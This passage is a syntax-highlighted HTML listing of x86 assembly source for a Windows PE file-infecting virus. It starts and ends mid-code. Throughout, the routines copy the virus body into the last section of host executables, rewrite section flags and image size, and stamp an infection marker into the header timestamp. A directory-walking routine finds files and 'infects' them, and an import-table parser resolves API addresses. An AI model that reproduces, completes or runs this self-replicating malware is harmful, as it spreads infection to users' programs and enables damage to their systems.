        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">v_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.cPushad.cPushad.Pushad_eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get start of virus code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.cPushad.cPushad.Pushad_edx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get embedded base</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">                                   </span><span class="sc1">;copy virus code</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebp.cPushad.Pushad_eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebp.cPushad.Pushad_edi</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;hardcode some valuez..</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">delta_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;change characteristicz of last section in the PE header..</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">;edx=0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;calculate new size of last section</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">v_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;calculate new virtual size of last section</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">n_vir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">n_vir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">;update size of last section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;get original file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;update size of image field in the PE header</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">n_img</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">n_img</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_Characteristics.hiw.hib</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">;change section flagz</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_CheckSum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;calculate special checksum to mark infected filez</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">2Dh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">0B2FD26A3h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0D4000000h</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_CheckSum.hiw</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_TimeDateStamp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;store checksum value</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;get original file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;calculate new file size..</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">carry?</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;use size paddin..</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">end_Attach</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">needed_ret</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Attach</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Process_Dir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;this function receives a pointer to an asciiz string</span><span class="sc0">
                </span><span class="sc1">;  containin a path, then it searches filez with an extension</span><span class="sc0">
                </span><span class="sc1">;  matchin the list of extensionz, and finaly infects them.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EDI = pointer to pathname</span><span class="sc0">
                </span><span class="sc1">;  EAX = size of pathname</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">needed_ret</span><span class="sc0">      </span><span class="sc1">;if pathname greater than 7Fh characterz, jump</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'          ;add '</span><span class="sc0">\</span><span class="sc13">' to the pathname if not included
</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Find_Filez</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">Find_Filez</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;find filez in the specified pathname..</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'\' - '</span><span class="sc4">*</span><span class="sc5">.</span><span class="sc4">*</span><span class="sc13">'
</span><span class="sc0">        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">findfirst</span><span class="sc0">       </span><span class="sc1">;find each file "*.*" in the path</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Attach</span><span class="sc0">      </span><span class="sc1">;if error, jump</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save search handle</span><span class="sc0">

</span><span class="sc5">Process_File</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;a file was found, process it</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Process_File3</span><span class="sc0">                   </span><span class="sc1">;process file, infect it</span><span class="sc0">

</span><span class="sc5">Find_Next</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindNextFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;find next file</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;more filez?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Process_File</span><span class="sc0">                            </span><span class="sc1">;yea, process it, jump</span><span class="sc0">

</span><span class="sc5">Find_Close</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;close search</span><span class="sc0">

</span><span class="sc5">end_Find</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">end_Process_Dir</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">APICall@n_2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;call an API and pass two parameterz</span><span class="sc0">

</span><span class="sc5">APICall@n</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;this function calls an API and passes "n" parameterz</span><span class="sc0">
                        </span><span class="sc1">;  as argumentz</span><span class="sc0">
                        </span><span class="sc1">;on entry:</span><span class="sc0">
                        </span><span class="sc1">;  EAX = API function adress</span><span class="sc0">
                        </span><span class="sc1">;  ECX = number of paremeterz</span><span class="sc0">

                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">push_args</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;push parameter</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">push_args</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;call API</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">APICall@n</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">IGetProcAddressIT</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszKernel32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc1">;gets a pointer to an API function from the Import Table</span><span class="sc0">
                       </span><span class="sc1">;  (the object inspected is in raw form, i.e. memory-maped)</span><span class="sc0">
                       </span><span class="sc1">;on entry:</span><span class="sc0">
                       </span><span class="sc1">;  TOS+08h (Arg2): API function name</span><span class="sc0">
                       </span><span class="sc1">;  TOS+04h (Arg1): module name</span><span class="sc0">
                       </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                       </span><span class="sc1">;on exit:</span><span class="sc0">
                       </span><span class="sc1">;  EAX = RVA pointer to IAT entry</span><span class="sc0">
                       </span><span class="sc1">;  EAX = 0, if not found</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get KERNEL32 module handle</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get address of PE header + MZ_lfanew</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">    \ </span><span class="sc1">;get size of import directory</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Import</span><span class="sc0">            \
                        </span><span class="sc5">.DD_Size</span><span class="sc0">              \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">   </span><span class="sc1">;if size is zero, no API imported!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">    \ </span><span class="sc1">;get address of Import directory</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Import</span><span class="sc0">            \
                        </span><span class="sc5">.DD_VirtualAddress</span><span class="sc0">    \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Rva2Raw</span><span class="sc0">                 </span><span class="sc1">;find size and raw start of import section</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Pushad_ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ImportHdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;save raw adress of import section header for l8r use</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">

</span><span class="sc5">Get_DLL_Name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;scan each import descriptor inside import section to match module name specified</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;diference (if any) between start of import table and start of import section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.esi.ID_Name</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get RVA pointer to imported module name</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressIT2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">    </span><span class="sc1">;end of import descriptorz?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;convert RVA pointer to RAW</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;check if it points inside section</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,-</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;save next import descriptor for later retrieval</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get module name specified from Arg1</span><span class="sc0">

</span><span class="sc5">Next_char_from_DLL</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;do a char by char comparison with module name found inside seccion</span><span class="sc0">
                        </span><span class="sc1">;stop when a NULL or a dot '.' is found</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IT_nup</span><span class="sc0">          </span><span class="sc1">;its a dot</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'.'</span><span class="sc4">+</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">no_up</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">;convert to upercase</span><span class="sc0">
 </span><span class="sc5">no_up</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc12">'a'</span><span class="sc0">
